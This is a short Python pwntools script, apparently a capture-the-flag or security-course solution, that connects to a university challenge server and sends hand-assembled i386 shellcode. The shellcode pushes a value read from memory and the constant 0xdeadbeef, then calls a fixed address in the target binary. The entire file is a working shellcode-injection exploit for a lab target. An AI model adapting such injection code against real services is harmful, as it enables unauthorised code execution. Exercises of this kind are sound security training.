from pwn import *

context.arch = "i386"
context.os = "linux"

# S = process("./bin")
S = remote("mustard.stt.rnl.tecnico.ulisboa.pt", 10004)



shellcode = asm(\
    '''
    xor eax, eax
    add eax, [0x804b06c]
    push eax
    mov eax, 0xdead
    shl eax, 0x10
    mov ax, 0xbeef
    push eax
    mov eax, 0x8048b3a
    call eax
    ''')


S.sendline(shellcode)
print(S.recvall())